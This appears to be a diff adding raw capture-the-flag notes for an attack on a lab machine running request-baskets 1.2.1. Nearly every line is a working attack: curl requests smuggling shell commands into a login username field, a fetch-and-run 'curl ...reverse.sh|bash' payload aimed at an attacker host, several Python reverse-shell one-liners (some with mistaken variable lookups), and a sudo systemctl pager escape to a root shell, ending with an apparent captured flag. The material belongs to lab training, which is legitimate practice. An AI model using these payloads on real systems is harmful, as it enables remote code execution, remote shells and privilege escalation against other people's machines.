@@ -1,0 +1,24 @@
+10.10.11.224
+request-baskets 1.2.1 
+curl 'http://127.0.0.1:80/login' \
+  --data 'username=;`id > /tmp/bbq`'
+
+
+curl -X POST --data 'username=;`curl -X POST http://10.10.11.224:55555/Digimon --data "$(id)"`' http://10.10.11.224:55555/Digimon
+
+
+curl 'http://10.10.11.224:55555/Digimon/login'  --data 'username=;`curl 10.10.16.25/reverse.sh|bash`'
+curl 'http://10.10.11.224:55555/Digimon/login'  --data 'username=;`curl 10.10.16.25:8000/reverse.sh|bash`'
+curl 'http://10.10.11.224:55555/web/Digimon/login'  --data 'username=;`curl 10.10.16.25:8000/reverse.sh|bash`'
+
+curl 'http://10.10.11.224:55555/Digimon'  --data 'username=;`curl 10.10.16.25:8000/reverse.sh|bash`'
+
+
+export RHOST="10.10.16.25";export RPORT=4442;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("10.10.16.25"),int(os.getenv("442"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("10.10.16.25"),int(os.getenv("442"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+
+export RHOST="10.10.16.25";export RPORT=334;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+
+sudo /usr/bin/systemctl status trail.service
+!sh
+a9018a5bfb92c1bd648885fb7dcec7a2
